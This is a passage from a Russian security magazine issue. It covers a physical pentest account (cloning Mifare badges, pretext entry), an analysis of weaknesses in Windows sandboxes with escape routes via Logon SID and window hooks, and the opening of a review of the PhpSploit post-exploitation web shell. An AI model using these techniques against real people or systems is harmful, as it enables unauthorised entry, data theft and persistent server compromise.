  В моей практике были работы, которые с небольшой натяжкой можно на-
звать пентестами с попыткой преодоления физического периметра. Правда,
они сводились к использованию технических средств и возможных уязвимо-
стей в СКУД в совокупности с социальной инженерией.
   Преодолевать периметр во всех случаях приходилось только через леги-
тимные точки входа — например, через капсулу-турникет, никак не через забор
с попутным разрезанием колючей проволоки. Эти эксперименты были орга-
низованы исключительно на добровольных началах, и я, естественно, не пре-
тендовал на покрытие всех возможных векторов атаки в рамках рассматри-
ваемой модели. Я выбирал те, которые интересны мне и наиболее вероятны
с технической точки зрения. В рамках подобных работ я отказался от любых
опасных вариантов прямого взаимодействия с сотрудниками компании.





Простейшие отмычки
CASE
Если рассматривать систему СКУД с точки зрения злоумышленника, который
пытается проникнуть в организацию, то можно провести аналогию с shared-хо-
стингами. Сайт-визитка со статическим контентом на таком хостинге в меньшей
безопасности, нежели на выделенном сервере. Так и с организациями — си-
стему СКУД намного легче преодолеть в офисных центрах (там и преодоле-
вать особо нечего), чем в зданиях, которые обслуживают одну-единственную
компанию.
   Проект начинается с разведки, основная цель которой — получить как мож-
но больше информации о системе СКУД. Это не только техническая состав-
ляющая, но и внешний вид пропусков, список легитимных точек входа и даже
дресс-код.
   Если абстрагироваться от всех нюансов, задача разведки сводится к вы-
явлению технологий, используемых для реализации СКУД. Определить, какие
именно пропуска используются в офисных центрах, обычно не составляет тру-
да (вообще в большинстве случаев это Mifare Classic). Офисные центры часто
имеют большие лобби, и ни у кого не возникает вопросов к человеку, который
разговаривает по телефону и пялится на турникеты, ходит туда-сюда, смотрит,
что делает охрана и что происходит на ресепшене.
   Попасть внутрь офисного здания можно, к примеру, под предлогом заинте-
ресованности в аренде помещения. В таком случае тебя, вероятно, встретит
человек, который имеет идентификатор, дающий доступ ко всем помещени-
ям — вдруг тебя заинтересуют несколько из них? Использование подобного
идентификатора-карты сравнимо с использованием учетной записи админи-
стратора домена для доступа к пользовательским машинам (тогда как пользо-
ватели обладают привилегиями локального администратора). Задача заклю-
чается в том, чтобы аккуратно скопировать такой ключ и никак себя не выдать.
Это не так сложно, поверь мне.
   Когда здание принадлежит одной компании, о лобби речи не идет. Необ-
ходимо определить то место, в котором ты окажешься ближе к сотрудникам,
не вызывая подозрений. Такая точка может находиться, к примеру, у ворот
ограды, через которые сотрудники проходят на территорию организации.
  Найдя удачные места, можно переходить к подготовке технических средств,
которые позволят скопировать метку пропуска. Не буду заострять внимание
на подготовке хардвара, с этим прекрасно справляются ребята из проекта
Hardware Village. «Рыбалку» лучше всего устраивать на рассвете — большин-
ство офисных работников даже не обратит внимания на человека, который
просто стоит где-то возле проходной. Все чертовски хотят спать по утрам, им
не до тебя.
  После «рыбалки» возникает еще одна нетривиальная задача — понять,
какие именно из перехваченных данных тебе пригодятся. Хорошо, конечно,
когда организации используют метки, идентификаторы которых похожи: если
во всей куче данных ты найдешь парочку похожих идентификаторов, то будет
по крайней мере ясно, что ты на верном пути. Однако в моей практике однаж-
ды было так, что я не мог понять, какой именно идентификатор использовать.
  В таких случаях приходится либо надеяться на интуицию и везение, либо
продолжать рыбачить в поисках нужного идентификатора. Второй вариант
для меня не подходил, так что пришлось выбирать наугад. Не повезло: пройти
турникеты не удалось, и оставалось только улыбнуться охране и покинуть зда-
ние. Во всех остальных случаях (которые, правда, можно сосчитать по паль-
цам) проникновение на территорию заказчика прошло успешно — во многом
просто везло.
  Подобные работы демонстрировали лишь одно — несостоятельность ис-
пользования Mifare Classic как идентификаторов пользователей СКУД. Вооб-
ще, необходимо было еще анализировать такие штуки, как:
•  логика СКУД;
•  права доступа к помещениям (например, по аналогии с привилегиями в AD);
•  лазейки на периметре;
•  мертвые зоны видеонаблюдения;
•  работоспособность сигнализации;
•  замки — на предмет устойчивости к взлому;
•  физическая защищенность линий коммуникации (и под землей, ага).





                                RFID grabber by bishopfox.com

К сожалению, моя квалификация и доступное мне оборудование не позволяли
произвести более полный анализ. Признаюсь, в этом вопросе я придержива-
юсь мнения, что все же нужна специализация. Во всех вещах одновременно
разбираться невозможно — чего стоит один только локпикинг.
  Подобные услуги, безусловно, интересны для заказчика, но дороги в ре-
ализации по сравнению с типовым пентестом. Спрос вряд ли окажется на-
столько большим, чтобы держать в штате человека с необходимыми профес-
сиональными навыками, — проще собрать команду под конкретный проект.
Однако человека с подобными профессиональными навыками в привычной
для нас среде найти сложно, а договориться о сотрудничестве еще сложнее.
К тому же стычки с охраной могут закончиться членовредительством — к та-
ким приключениям готов не каждый. И наконец, требуется навык актерского
мастерства, он тоже есть не у всех.

OUTRO
Не хочу делать утверждений, есть ли будущее у подобных консалтинговых ус-
луг в РФ или нет. Плацдарм есть — пробные пентесты оказались удачными.
На данный момент ни одна из консалтинговых компаний в РФ не может похва-
статься тем, что способна оценить физическую безопасность того или ино-
го объекта. Не исключено, что наличие подобной услуги может стать удачным
маркетинговым ходом.
   Ребята из QIWI, к примеру, не стали дожидаться, пока на рынке появится
подобная услуга, и сами собрали свою red team, которая удачно организовала
проникновение на территорию организации. Об этом нам рассказал Кирилл
Ермаков (@isox_xx) в докладе для секции Defensive Track на ZeroNights 2015.
Надеюсь, организаторы ZeroNights не затянут с публикацией материалов, и ты
сможешь узнать об опыте команды QIWI, если вдруг пропустил доклад.
   Stay tuned!
ПОЛЕЗНАЯ ИНФОРМАЦИЯ


Aspects of physical security
• Red Teaming: The Art of Ethical Hacking
• The Anatomy of a Subway Hack
• MIT Guide to Lock Picking
• No-Tech Hacking

Общая теория по пентестам
•  VulnerabilityAssessment
• Open Source Security Testing Methodology Manual
• The Penetration Testing Execution Standard

Немного практики
•  PentesterLab
•  Penetration Testing Practice Lab

В закладки
• Open Penetration Testing Bookmarks Collection

Right way to contribute
• DC7499
• DC7812
• 2600 russian group
ВЗЛОМ
СКРЕЩИВАЕМ
ЕЖА С УЖОМ
              ИЛИ КАК
               ОБЕСПЕЧИТЬ
             ИЗОЛЯЦИЮ
              ПРОЦЕССОВ
              И НЕ СЛОМАТЬ
              WINDOWS





                                                  Василий Букасов,     Дмитрий Щелкунов,
                                                            технический директор     генеральный директор
                                             ООО «Рекрипт»        ООО «Рекрипт»
                                                                    fixer@re-crypt.com      schelkunov@re-crypt.com
Как изолировать подозрительные процессы в ОС Windows
и не сломать саму ОС? Как создать надежную и совме-
стимую с Windows программную песочницу без аппа-
ратной виртуализации и перехватов функций ядра, но с
использованием документированных встроенных меха-
низмов безопасности ОС? Мы расскажем о наиболее
часто встречающихся проблемах, с которыми сталкивают-
ся разработчики (а в итоге — потребители) программных
песочниц. Ну и разумеется, предложим свое решение :).

ВВЕДЕНИЕ, ИЛИ КАК ПЛОХО ЖИТЬ БЕЗ ПЕСОЧНИЦЫ
Среди профессионалов есть несколько аксиом, о которых они не любят говорить.
А что говорить об аксиомах? Они есть и есть. Вроде всем понятно, как дважды
два. Например, одна из них — сигнатурные антивирусы не защищают. Ну то есть
не защищают, и все тут. Сказано-пересказано об этом масса всего и много-
много раз. С примерами, красивыми презентациями, танцами и плясками. Да
и эпидемии всякой гадости типа Ransomware служат одним из доказательств
неэффективности сигнатурных и эвристических технологий. Всякого рода
крипторы и обфускаторы успешно решают задачу защиты уже давно извест-
ной малвари от обнаружения, и в течение некоторого времени эта малварь
не детектируется антивирусами. Этого времени вполне достаточно, чтобы ко-
му-то стало плохо, а кому-то хорошо. То есть речь даже не о 0day. Можно взять
старую известную бородатую малварь, поморфить ее, убрать поведенческие
сигнатуры (работа на пару дней для лентяя) и юзать ее снова, а потом еще раз,
и еще, пока не надоест или пока не посадят. При этом люди, которые прода-
ли лекарство от того, чтобы это самое плохо никогда не наступало, вроде как
и ни при чем. Они с серьезными лицами публикуют какой-нибудь бюллетень
и рассказывают о гигиене в интернете, забывая при этом сказать, что если
эту самую гигиену соблюдать полностью, то антивирусы, тем более платные,
практически и не нужны.

ПЕСОЧНИЦЫ И ОСОБЕННОСТИ ИХ РЕАЛИЗАЦИИ
Итак, антивирусы не спасают, а иногда ломают то, что уже есть. «Давайте по-
дойдем к защите с другой стороны и будем изолировать процессы друг от
друга», — сказал кто-то бесконечно умный. Действительно, здорово, когда по-
дозрительные процессы выполняются в некоторой изолированной среде, на-
зываемой песочницей. Выполняемая в песочнице малварь не может покинуть
ее пределов и навредить всей системе. Этот могло бы быть решением, однако
в существующих реализациях песочниц есть нюансы...
   Далее мы как раз и будем обсуждать все тонкости построения песоч-
ниц, знание которых тебе обязательно пригодится, когда понадобится вы-
брать средство изоляции процессов или HIPS (Host-based Intrusion Prevention
System — система предотвращения вторжений для рабочих станций).

НЮАНС № 1, ИЛИ ОДНА ПЕСОЧНИЦА НА ВСЕХ
Большинство песочниц на самом деле не обеспечивают изоляцию процессов.
По правде говоря, в большинстве реализаций защищаемая система делится
на две части — доверенную и недоверенную. В доверенной части выполняют-
ся обычные процессы, а в недоверенной — изолируемые. То есть все изоли-
руемые процессы выполняются в одной песочнице, имеют доступ друг к другу
и к ресурсам друг друга, используют тот же реестр и ту же файловую систему.
   Таким образом, малварь может закрепиться в самой песочнице и старто-
вать эпизодически с одним из изолируемых приложений (или с несколькими
изолируемыми приложениями, или с любым из них). При этом часто песочницы
не логируют действия изолируемых процессов. Действия, на которые ругают-
ся HIPS, в песочницах вполне себе проходят без малейших реакций с поправ-
кой на изоляцию, что не очень хорошо.
   Как проверить, что изоляция устроена именно таким образом? Очень про-
сто! Запусти два приложения в песочнице. Например, notepad.exe и wordpad.
exe. Создай с помощью notepad.exe текстовый файл 1.txt.





Рис. 1. Создаем текстовый файл

Разумеется, данный файл будет сохранен не на рабочем столе, а в «виртуаль-
ной» директории. Попробуй открыть его Wordpad’ом (рис. 3).
Рис. 2. Похоже, для всех изолированных приложений создана одна изолированная среда





Рис. 3. Файл открывается на чтение

Итак, созданный одним изолированным приложением файл можно открыть с
помощью другого изолированного приложения. Скажем прямо, изоляция уже
не очень. Но может, по крайней мере от записи будет какая-то защита? Меня-
ем содержимое (рис. 4).
Рис. 4. Изменяем содержимое текстового файла

И сохраняем. А теперь попробуем открыть файл 1.txt с помощью notepad.exe.
Конечно же, запустим notepad.exe в песочнице (рис. 5).





Рис. 5. Модифицированный текстовый файл

И вот то, о чем мы говорили. Два изолированных приложения не изолирова-
ны друг от друга. Получается, что такую изоляцию делали не совсем понятно
для чего. Даже шифровальщик, не получив доступ к локальным папкам на ком-
пьютере, может пошифровать все в завиртуализованной директории, а если
«повезет», то и на сетевых ресурсах, так как настройки для песочницы одни
для всех изолируемых приложений.

НЮАНС № 2, ИЛИ НЕДОИЗОЛЯЦИЯ
Да, изолируемые процессы не могут достучаться до доверенной части систе-
мы... но в большинстве реализаций только на запись. То есть они могут читать
отовсюду практически без ограничений и часто имеют доступ к сети. Это сде-
лано, видимо, для большей совместимости, но это нельзя назвать изоляцией.
   Попробуй провести простенький опыт с песочницей на свой выбор. Соз-
дай директорию на жестком диске. Скажем, такую: E:\Photos. Помести в нее,
например, фотографию (рис. 6).





Рис. 6. Приватная фоточка


Запусти Internet Explorer в песочнице и попробуй отправить данное изображе-
ние, скажем, на rghost.





Рис. 7. Изолированный браузер по умолчанию имеет доступ на чтение к данным
Рис. 8. Изолированное в песочнице приложение сумело украсть приватную фотографию

Ну и как? Получилось? Если опыт удался, то это не очень хорошо. Еще хуже,
если в песочнице отсутствует возможность задать директории, к которым
изолированные приложения не будут иметь доступ. И совсем нехорошо, если
изолированные приложения могут читать данные из директорий текущего
пользователя.
   Виртуализация файловой системы и реестра в большинстве реализаций
построена по принципу «копирование по требованию». То есть если файл
нужно просто прочитать, то он читается из исходной директории при отсут-
ствии аналога в виртуальной директории. Если такой же файл присутствует
в виртуальной директории, то изолируемое приложение будет работать с ним.
То же можно сказать про виртуальный реестр. Ну и понятно, что при попытке
записать файл по реальному пути он запишется в виртуальную файловую си-
стему. Почти всегда. Таким образом, если малварь «изолирована» в такой пе-
сочнице, то она сможет иметь полный доступ ко всем другим «изолируемым»
процессам, практически ко всем данным в системе на чтение и к завиртуа-
лизованным (сохраняемым изолированными приложениями) данным (которые
часто общие для всех изолируемых приложений) на запись.

НЮАНС № 3, ИЛИ «А ДАВАЙТЕ СДЕЛАЕМ
ЕЩЕ ОДИН ВЕЛОСИПЕД, ЭТО ТАК ИНТЕРЕСНО»
Нас всегда удивляла поразительная способность некоторых антивирусных
компаний решать задачи в лоб, не задаваясь вопросом, а надо ли решать эту
задачу вообще, надо ли решать ее именно так, надо ли ломать что-то одно,
чтобы построить что-то другое. Создается такое ощущение, что все решения
банально и бездумно слизываются друг у друга. Впрочем, деньги есть — ума
не надо, как говаривал кто-то из классиков. Если запустить утилиту Wincheck
от Red Plait, то можно увидеть, как именно реализованы механизмы изоляции,
и заодно ответить на вопрос, почему качество изоляции под 64-битные вер-
сии Windows заметно слабее, чем под 32-битные. Wincheck — шустрая, до-
статочно надежная и бесплатная утилита, которая позволяет искать rootkit’ы
в системе. Cкачиваем Wincheck, запускаем и можем увидеть что-то типа этого:

SDT entry C (ZwAdjustPrivilegesToken) hooked 872DB50E
    \SystemRoot\system32\DRIVERS\dirtyguard.sys!
SDT entry 16 (ZwAlpcConnectPort) hooked 872DB91A
    \SystemRoot\system32\DRIVERS\dirtyguard.sys!
SDT entry 17 (ZwAlpcCreatePort) hooked 872DB8C8
    \SystemRoot\system32\DRIVERS\dirtyguard.sys!
...
...
...
SDT entry 170 (ZwSystemDebugControl) hooked 872DABCC
    \SystemRoot\system32\DRIVERS\dirtyguard.sys!
SDT entry 172 (ZwTerminateProcess) hooked 872DA534
    \SystemRoot\system32\DRIVERS\dirtyguard.sys!
SDT entry 173 (ZwTerminateThread) hooked 872DA302
    \SystemRoot\system32\DRIVERS\dirtyguard.sys!

Большинство реализаций песочниц используют rootkit-технологии, перехваты-
вая солидную часть функций ядра. В этом листинге приведены банальные хуки
записей таблицы дескрипторов системных сервисов (SSDT), которая, кстати,
охраняется PatchGuard (но об этом позже). И так делают многие.
  К слову, тот факт, что у некоторых производителей антивирусных реше-
ний из флагманских продуктов пропала песочница, можно объяснить тем, что
PatchGuard начал контролировать Shadow SSDT, которая отвечает за работу
с окнами и располагается в win32k.sys . Ведь сбежать из песочницы можно
и через SetWindowsHookEx, например. Чтобы перекрыть этот способ, надо
перехватить NtUserSetWindowsHookEx в Shadow SSDT.
   Глядим на результат Wincheck и видим:

Shadow SDT: 90C16000, limit 339
win32k_sdt[14] (NtGdiBitBlt) hooked, addr 872DF818
    \SystemRoot\system32\DRIVERS\dirtyguard.sys
win32k_sdt[125] (NtGdiDeleteObjectApp) hooked, addr 872E0160
    \SystemRoot\system32\DRIVERS\dirtyguard.sys
...
...
...
win32k_sdt[588] (NtUserSetWinEventHook) hooked, addr 872E046A
    \SystemRoot\system32\DRIVERS\dirtyguard.sys
win32k_sdt[595] (NtUserSystemParametersInfo) hooked, addr 872DE56A
    \SystemRoot\system32\DRIVERS\dirtyguard.sys

Есть масса статей на тему того, что это rootkit-технологии и это небезопасно,
но кого это когда-то останавливало... Своим путем, через тернии и жесткий
хукинг  ядра,  разработчики  песочниц  пытаются  реализовать  ме-
ханизмы  контроля  доступа  Windows  заново!  Сейчас  они  нахо-
дятся  где-то  на  уровне  Windows  2000,  сильно  опережая  ее  по
забагованности. И  это  логично,  так  как несколько даже очень  та-
лантливых разработчиков не смогут учесть всех нюансов тех вещей,
которые создавались годами и тестировались миллионами пользователей.
  При этом практически никто не использует штатные отлаженные встро-
енные механизмы безопасности самой ОС. Вместо этого их пытаются обой-
ти и предлагают взамен непонятный суррогат, что вряд ли поможет против
серьезной угрозы, а иногда может и навредить, так как поверхность атаки
увеличивается.
  В середине 2013 года мы протестировали способ побега из песочниц на
основе инжекта в explorer.exe. Это был PowerLoader. Подавляющее большин-
ство песочниц не устояло. В некоторых потребовалось сделать банальные
вещи, вроде снять юзермодные хуки или вызвать напрямую ядро, и вопрос
был решен. Хорошо сопротивлялись только две, одна из которых на текущий
момент не развивается, а другую убрали из флагманского продукта (анти-
вирус). Это говорит о том, что способ, основанный на перехватах, защища-
ет только от известных разработчикам способов побега из песочниц!
   Хотя не будем столь критичны. Есть решения, которые научились исполь-
зовать механизмы безопасности ОС, не ломая их. Итак, если ты не видишь
хуков ядра, то есть вероятность, что производители более грамотно подошли
к вопросу изоляции.
   Давай попробуем проверить. Для начала скачаем бесплатную утилиту
Process Hacker. Запустим изолированный Internet Explorer, после чего — Process
Hacker (рис. 9).
Рис. 9. Запущенный Process Hacker

На скриншоте мы видим выделенные темным процессы. Эти процессы запуще-
ны из-под анонимного пользователя (NT AUTHORITY\ANONYMOUS LOGON) и
имеют уровень целостности (Integrity Level) Untrusted, а их Logon SID — S-1-5-
7. Да-да, речь идет о Sandboxie. Только они так делают. Подробнее об уров-
нях целостности и механизмах безопасности Windows мы настоятельно ре-
комендуем почитать в книге Марка Руссиновича и Дэвида Соломона Windows
Internals. Сейчас же скажем, что процесс запущен таким образом, что не имеет
прав доступа практически ни к чему, и, если бы не одно но, процесс был бы вы-
гружен из памяти операционной системой, а говоря проще, свалился бы. Тем
не менее он не падает, а работает. И изолирован, без хуков ядра и без аппа-
ратной виртуализации (тоже хуки, но об этом позже). Как же так происходит?
Посмотрим повнимательнее.
   Раз уж мы, помимо всего прочего, делаем некий мини-обзор хакерских
утилит, то нельзя пройти мимо GMER. Скачаем, запустим и поглядим. Хуков
ядра нет. Уже хорошо. А что же есть? Как процесс, который запущен так, что
не должен работать, работает? И здесь на помощь приходят те же хуки, но в
пользовательском режиме. Типа таких:

.text C:\Program Files\Internet Explorer\iexplore.exe[2852]
    ntdll.dll!NtAdjustPrivilegesToken  7565268 10 Bytes
    JMP 73AAB7E0 C:\Program Files\Sandboxie\SbieDll.dll

То есть в каждом приложении, запущенном в песочнице, огромная масса пере-
хватов (сплайсинг) на уровне пользователя, которые через механизмы межпро-
цессного взаимодействия проксируют запросы в центр принятия решений. По
всей видимости, в данном случае это сервис SbieSvc (впрочем, там и в драйвере
логики немало). А данный центр, сверяясь с базой, принимает какие-то разреши-
тельные или запретительные решения. При этом, если избавиться от хуков, при-
ложение перестанет работать, так как ему запрещено практически все. Иными
словами, данное решение реализует в чистом виде принцип «Что не разрешено,
то запрещено». Однако в таком подходе есть ряд минусов, связанных, во-пер-
вых, с быстродействием (каждый перехват должен быть обработан), во-вто-
рых, с совместимостью с антивирусными решениями (они не очень любят хуки,
даже пользовательского режима), в-третьих, с совместимостью с программами,
защищенными протекторами (там своя песня, и они тоже очень не любят хуки,
иногда предательски от них избавляясь). Ну и «портянка» разрешительных правил
весьма велика, что влечет за собой проблемы совместимости и быстродействия.

НЮАНС № 4, ИЛИ ПОЧЕМУ ПЛОХО ПИЛИТЬ СУК,
НА КОТОРОМ СИДИШЬ
В большинстве реализаций изолируемое приложение запускается под тем же
пользователем, что и неизолируемое. Для реализации изоляции недостаточ-
но фильтровать работу с файловой системой и реестром. Надо отслеживать
открытие handle’ов, работу с COM-объектами, с ALPC в целом, с окнами и много
чего еще, что штатно умеет делать Windows, в частности SRM (Security Reference
Monitor). По своей старой традиции производители защитных технологий реша-
ют эти задачи хуками. Мы уже подробно писали об этом выше. При этом другая
защитная технология, PatchGuard, с хуками как раз борется. Впрочем, произво-
дители песочниц уже нашли решение в своем стиле, задействовав механизмы
виртуализации. Там же по ссылке можно увидеть, почему это решение, мягко
говоря, не очень хорошее. И именно по этой причине разработчикам зачастую
непросто реализовать свою изоляцию для каждого из процессов.
   Очень часто маркетологи антивирусных компаний (и не только) подают нам
использование аппаратной виртуализации как некую фичу, которая карди-
нально увеличит безопасность. Это сейчас тренд такой, активно подогрева-
емый нами, системными программистами. Мы же любим большие, сложные,
наукоемкие и многобюджетные проекты! Но на самом деле в большинстве
случаев уход на уровень гипервизора — это побег от PatchGuard, не более
того. Возможность ставить хуки безнаказанно. Во всяком случае, пока :). Ну и
да, это во всех отношениях дорого, начиная с требования к железу и заканчи-
вая дороговизной разработки. Гипервизоры писать недешево. За все платит
потребитель, разумеется.

НЕМНОГО О ВСТРОЕННЫХ МЕХАНИЗМАХ БЕЗОПАСНОСТИ
WINDOWS И ИЗОЛЯЦИИ ПРОЦЕССОВ С ИХ ПОМОЩЬЮ
Как мы заметили выше, на рынке крайне мало решений, которые в принципе
используют встроенные механизмы безопасности Windows. То, о котором мы
говорили, использует их, но весьма оригинальным способом — только для за-
прещения. Этот путь чреват рядом проблем.
  А как еще можно использовать эти механизмы для изоляции процессов?
На самом деле можно запускать приложения под разными пользователями,
и большую часть работы сделают встроенные механизмы разделения досту-
па Windows. Хотя, конечно же, мини-фильтры на файловую систему и реестр
все-таки нужны.
   Используя штатные механизмы дискреционного контроля доступа (мани-
пуляции с DACL объектов), мы можем регулировать права доступа субъектов
(наших изолированных программ, запущенных под новыми пользователями)
к объектам (файловой системе, реестру). Помимо этого, мы можем совер-
шенно документированно и безопасно регулировать права доступа к станции,
права доступа к рабочему столу, системные привилегии и уровень доверия.
   Однако и здесь есть ряд нюансов, если их не учитывать, можно свести без-
опасность решения к нулю либо понизить его стабильность.

КАК ПРАВИЛЬНО ЗАПУСКАТЬ ПРОЦЕССЫ
ПОД ДРУГИМ ПОЛЬЗОВАТЕЛЕМ
Есть такой факт: начиная с Windows Vista механизм Run As «сломан». И хоть
это не совсем новость, но пока не все об этом знают. Проведем простой экс-
перимент. Запустим Process Explorer. Запустим notepad.exe. Кликнем два раза
в окне Process Explorer на notepad.exe. Зайдем во вкладку Security и выберем
там вкладку Permissions (рис. 10).





Рис. 10. Logon SID
Мы видим некоторую неизвестную учетную запись, имеющую SID S-1-5-5-
0-80701. Это Logon SID. Разрешения процесса для Logon SID: Query limited
information, Query information, Read memory, Terminate, Synchronize, Read. Раз-
решения токена для Logon SID: Assign as primary token, Duplicate, Impersonate,
Query, Query source and Read. Разрешения потока для Logon SID: Query limited
information, Query information, Get context, Synchronize and Read.
  Все это означает, что если процесс стартует под другим пользователем
посредством Run As (который запускает процесс с текущим Logon SID), то в
большинстве случаев поток данного процесса сможет получить токен другого
процесса (целевого, запущенного под исходным пользователем), имперсони-
ровать контекст безопасности целевого процесса и получить все права, кото-
рыми обладает целевой процесс, что будет означать выход из изоляции.
   Таким образом, при анализе средства изоляции процессов нужно обра-
щать внимание на Logon SID, с которым был запущен изолируемый процесс.
Даже если процесс запущен под другим пользователем, то в случае совпаде-
ния Logon SID побег из песочницы может быть возможен.
   Существует всего три документированных способа запустить процесс от
имени другого пользователя:
•  CreateProcessWithLogonW. На вход принимает логин и пароль, создает про-
   цесс с тем же Logon SID. Не подходит.
•  CreateProcessAsUser. Создает процесс с тем же Logon SID. Не подходит.
•  CreateProcessWithTokenW. Единственная подходящая функция.

Именно CreateProcessWithTokenW необходимо использовать для запуска при-
ложений под другим пользователем. Это единственно верное решение.

КОВАРНЫЙ ДЕСКТОП И ИЗОЛЯЦИЯ
Начиная с Vista в ОС Windows появился защитный механизм UIPI (User Interface
Privilege Isolation). Этот механизм регулирует обмен сообщениями между при-
ложениями с разными уровнями доверия (Integrity levels). А теперь вспомним
старушку Windows XP.
Рис. 11. Проверка возможности выполнения SetWindowsHookEx в ядре Windows XP

На рис. 11 видно, что если приложение запущено под другим пользователем,
то SetWindowsHookEx не отработает для приложений, запущенных, например,
под текущим пользователем. Изоляция работает! Но в Windows XP :(. Погля-
дим, что происходит в более молодых ОС семейства Windows (рис. 12).





Рис. 12. Проверка возможности выполнения SetWindowsHookEx в молодых семействах
А здесь ситуация гораздо более интересная. Если UIPI включен (переменная
gbEnforceUIPI равна TRUE), то проверка пользователей, под которыми запу-
щены приложения, на эквивалентность опускается!
  Иными словами, если ты запускаешь приложение под другим пользовате-
лем в Windows Vista и выше на том же рабочем столе, что и приложения дру-
гих пользователей, и при этом для приложения выставлено право доступа ра-
бочего стола DESKTOP_HOOKCONTROL, то побег из такой песочницы становится
тривиальным. Право доступа рабочего стола DESKTOP_HOOKCONTROL разрешает
перехватывать любые оконные сообщения и позволяет устанавливать окон-
ные перехваты. Если отключить DESKTOP_HOOKCONTROL, то большой ряд прило-
жений перестанет работать. Например, рантайм MS Visual Studio требует, что-
бы присутствовало это право доступа. В противном случае все приложения,
скомпилированные с помощью MS Visual Studio, не будут функционировать.
  Решений проблемы не особо много:
1. Использовать хуки (проблема с PatchGuard и все те прелести, о которых мы
   говорили выше).
2. Запускать приложение с выключенным UIPI, который прибит гвоздями к
  UAC (User Account Control), что автоматически означает отключение UAC —
   одного из важнейших механизмов безопасности Windows (путь не для тех,
   у кого руки растут из плеч). И да, мы видели такое в одном не особо попу-
   лярном решении по изоляции процессов :).
3. Запускать изолируемые приложения на отдельных рабочих столах (путь для
   просветленных системных программистов, познавших Истину).

То есть если песочница вообще не использует отдельных рабочих столов в
процессе изоляции приложений, то дело нехорошо попахивает одним из двух
первых пунктов.
  Но и с отдельными рабочими столами поджидают подводные камни. Ока-
зывается, не все приложения любят запускаться на другом рабочем столе.
Некоторые особо вредные принципиально проверяют, на каком рабочем сто-
ле они запускаются. Например, Firefox может некорректно обновляться на от-
дельном рабочем столе, завершаясь сразу после запуска. Связано это с тем,
что процесс обновления запускается явно на winsta0/default, что приводит к
невозможности запуска из-за отсутствия прав доступа. Если это запатчить
или запускать на текущем рабочем столе, все будет работать. К счастью, для
Firefox и его форков можно отключить DESKTOP_HOOKCONTROL, что не делает не-
обходимым запуск на отдельном рабочем столе.
   Yandex-браузер  (версия  13.12.1599.12987)  содержит  библиотеку  C:\
Users\xxx\AppData\Local\Yandex\YandexBrowser\Application\30.0.
1599.12987\browser.dll. В ней где-то рядом с ChromeBrowserMainParts::PreMa
inMessageLoopRunImpl есть процедура, в которой вызывается GetStartupInfo,
из нее берется lpDesktop (в ней обычно WinStation\Desktop), через поиск «\»
вырезается имя рабочего стола и сравнивается с именем рабочего стола,
полученного через OpenInputDesktop, то есть, по сути, с текущим активным
рабочим столом. Если не совпадает, инициализация считается проваленной,
браузер завершается.
   Отвлечемся от главной темы и заметим, что так сравнивать некорректно.
Нельзя проверять только имя рабочего стола, надо учитывать и рабочую стан-
цию. Более того, реальный рабочий стол может быть и вовсе не тот, что вер-
нула GetStartupInfo. По понятной причине такой подход не дает стартовать
Yandex-браузер на отдельном рабочем столе. Специалисты Yandex сказали,
что это какая-то хитрая защита от прокликивания. Менять ее особо не стали с
тех пор. Возможно, немного усовершенствовали. К счастью, Yandex-браузер
не требует права доступа DESKTOP_HOOKCONTROL, что позволяет запускать его
изолированно на текущем рабочем столе.
   Таким образом, чтобы песочница была более универсальной, в ней попро-
сту необходим некоторый набор правил для наиболее популярных приложе-
ний — уменьшить вовлеченность пользователя в волшебный мир настройки
продукта под себя. Как пример, Firefox и Thunderbird приблизительно после
версии 37 не будут корректно отображать окна, если в разрешениях рабочего
стола не окажется DESKTOP_JOURNALRECORD и DESKTOP_JOURNALPLAYBACK. О та-
ких мелочах песочнице желательно бы знать заранее.

ИДЕАЛЬНЫЙ МИР, ИЛИ КАКОЙ ДОЛЖНА БЫТЬ ПЕСОЧНИЦА
В результате своих исследований мы поняли, что надежная песочница должна
обладать следующими свойствами:
1. С максимальной эффективностью использовать встроенные механизмы
   безопасности платформы, на которой она работает.
2. Уметь изолировать каждый процесс в отдельно настраиваемой изолиро-
   ванной среде.
3. Давать возможность регулировать доступ для каждого из процессов к
   объектам файловой системы и реестра, сменным носителям информации,
   сети, задавать привилегии и уровень доверия. То есть она должна быть
   максимально настраиваемой под конкретное поле применения.
4. Быть относительно легкой в использовании.
5. Журналировать свою работу. Желательно делать это в журнале ОС.
6. Не использовать хуков ядра ни при каких обстоятельствах.
7. Не ломать существующие механизмы безопасности ОС и вообще саму ОС.
8. Иметь постоянно расширяемую базу первоначальных настроек, чтобы как
  можно меньше вовлекать пользователя в процесс администрирования.
Все эти требования мы попытались воплотить в жизнь в тулзе под именем
ReHIPS. Она абсолютно бесплатна, и поэтому можешь вполне легально ее ска-
чать и поиграться с ней. Кто знает, быть может, удача улыбнется тебе и имен-
но ты сможешь найти способ удрать из нашей песочницы. В любом случае ты
всегда можешь прислать нам отзыв о своих впечатлениях от использования
продукта, за что мы будем очень благодарны.

НУ И В КОНЦЕ
Задача изоляции процессов только на первый взгляд кажется не такой уж
сложной, но на деле тут скрывается большое число подводных камней. Каж-
дый вендор решает эту задачу по-своему, кто-то более успешно, кто-то менее.
Теперь ты представляешь все слабые и проблемные места современных пе-
сочниц, поэтому, когда понадобится запустить потенциально опасное прило-
жение, сможешь подобрать соответствующий инструмент для его изоляции от
основной системы.
Взлом





                                Дмитрий «D1g1» Евдокимов,
                                                               Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!
                  PHPSPLOIT
                           PhpSploit — это фреймворк для удаленного управ-
                         ления, нацеленный на предоставление скрытого
                        интерактивного shell-подобного соединения через
                    HTTP между клиентом и веб-сервером. Как ты, на-
                        верное, уже понял из этой витиеватой фразы, это
                       инструмент для постэксплуатации, и он способен
                      поддерживать доступ  к скомпрометированному
                       серверу в целях повышения привилегий на нем.

Автор:                Особенности
nil0x42               Эффективность — более двадцати плагинов
                      для автоматизации задач постэксплуатации:
URL:                     •  запуск команд и просмотр файловой системы,
github.com/nil0x42/phpsploit     обход ограничений безопасности PHP;
                         •  загрузка и выгрузка файлов с целевой машины;
Система:                •  удаленное редактирование файлов;
Linux/Mac/Windows         •  запуск SQL-консоли на целевой машине;
                         •  создание reverse TCP шелла.

Скрытность — фреймворк от параноиков для параноиков:
•  практически незаметен для анализаторов логов и NIDS-детекторов
   на сигнатурах;
•  обход безопасного режима и общих ограничений безопасности PHP;
